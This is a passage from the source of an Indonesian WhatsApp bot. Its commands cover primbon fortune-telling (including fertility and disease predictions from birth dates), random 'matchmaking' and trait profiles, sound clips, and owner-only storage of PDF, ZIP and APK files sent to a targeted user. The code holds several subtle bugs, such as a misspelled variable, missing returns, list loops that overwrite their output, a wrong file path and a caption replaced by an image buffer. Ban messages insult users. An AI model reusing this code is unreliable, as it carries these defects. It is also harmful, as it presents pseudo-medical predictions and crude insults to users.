 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break

case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break

case 'sifatusaha': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!ext)reply `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break

case 'rejeki': case 'rezeki': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'pekerjaan': case 'kerja': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break

case 'potensipenyakit': case 'penyakit': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'artitarot': case 'tarot': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'fengshui': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} Koi, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break

case 'haribaik': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'harisangar': case 'taliwangke': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'harinaas': case 'harisial': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break

case 'nagahari': case 'harinaga': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'arahrejeki': case 'arahrezeki': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'peruntungan': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} Koi, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'weton': case 'wetonjawa': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break

case 'sifat': case 'karakter': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} Koi, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break

case 'keberuntungan': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} Koi, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break

case 'memancing': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'masasubur': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break

case 'shio': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
 if (!text) reply `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return reply(anu.message)
 qyuunee.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break

case 'jodoh': {
if (!m.isGroup) return
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ""
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "",
            subtitle: "",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"😳","id":""}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [me, jodoh], 
                  forwardingScore: 999,
                  isForwarded: false
                }
        })
    }
  }
}, {})

await qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
            }
            break
            
            case 'cekme':
					neme = args.join(" ")
					bet = `${m.sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await qyuunee.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
profile = await getBuffer(ppuser)
qyuunee.sendMessage(from, { image: profile, caption: profile, mentions: [bet]},{quoted:m})
break

case 'setvn':{
if (!isCreator) return reply(mess.owner)
if (args.length == 0) return reply(`*List VN*\n\n> menu\n> welcome\n> leave`)
loading()
let delb = await qyuunee.downloadAndSaveMediaMessage(quoted)
if (args[0] === 'menu') {
await fsx.copy(delb, `./mp3/private.mp3`)
reply(`🕊️ Sukses Mengubah Audio Menu`)
} else if (args[0] === 'welcome') {
await fsx.copy(delb, `./mp3/welcome.mp3`)
reply(`🕊️ Sukses Mengubah Audio Welcome`)
} else if (args[0] === 'leave') {
await fsx.copy(delb, `./mp3/sayonara.mp3`)
reply(`🕊️ Sukses Mengubah Audio Leave`)
} else {
reply('🚫 ERORR')
}
}
break

case 'setmenu':{
if (!isCreator) return reply(mess.owner)
if (args.length == 0) return reply(`*List Media*\n\n> video\n> image`)
loading()
let delb = await qyuunee.downloadAndSaveMediaMessage(quoted)
if (args[0] === 'video') {
await fsx.copy(delb, `./datakoi/video/menu.mp4`)
reply(`🕊️ Sukses Mengubah Video Menu`)
} else if (args[0] === 'image') {
await fsx.copy(delb, `./datakoi/video/menu.mp4`)
reply(`🕊️ Sukses Mengubah Image Menu`)
} else {
reply('🚫 ERORR')
}
}
break

case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
koi_s = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await qyuunee.sendMessage(m.chat, { audio: koi_s, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

case 'setcmd': {
if (!isCreator) return reply(mess.owner)
loading()
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) reply `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break

case 'delcmd': {
if (!isCreator) return reply(mess.owner)
loading()
if (!m.quoted) throw 'Reply Pesan!'
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) reply `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
reply(`Done!`)
}
break

case 'listcmd': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
let teks = `list cmd`
qyuunee.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break

case 'addpdf':{
if (!isCreator) return reply(mess.owner)
loading()
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await qyuunee.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break

case 'delpdf':{
if (!isCreator) return reply(mess.owner)
loading()
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break

case 'listpdf': {
if (!isCreator) return reply(mess.owner)
loading()
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⭔ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf Koi + sambil reply pesan target* \n\n Contoh 2 : yopdf Koi`
reply(teksoooo)
}
break

case 'yopdf':{
if (!isCreator) return reply(mess.owner)
loading()
let teks = `${text}`
{
qyuunee.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendpdf': {
if (!isCreator) return reply(mess.owner)
loading()
if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
qyuunee.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break

case 'addzip':{
if (!isCreator) return reply(mess.owner)
loading()
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await qyuunee.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break

case 'delzip':{
if (!isCreator) return reply(mess.owner)
loading()
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break

case 'listzip': {
if (!isCreator) return reply(mess.owner)
loading()
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip Koi + sambil reply pesan target* \n\n Contoh 2 : yozip Koi`
reply(teksooooo)
}
break

case 'yozip':{
if (!isCreator) return reply(mess.owner)
loading()
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
qyuunee.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendzip': {
if (!isCreator) return reply(mess.owner)
loading()
if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
qyuunee.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break

case 'addapk':{
if (!isCreator) return reply(mess.owner)
loading()
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await qyuunee.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break

case 'delapk':{
if (!isCreator) return reply(mess.owner)
loading()
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break

case 'listapk': {
if (!isCreator) return reply(mess.owner)
loading()
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk Koi + sambil reply pesan target* \n\n Contoh 2 : yoapk Koi`
reply(teksoooooo)
}
break

case 'yoapk':{
if (!isCreator) return reply(mess.owner)
loading()
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
qyuunee.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendapk': {
if (!isCreator) return reply(mess.owner)
loading()
if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
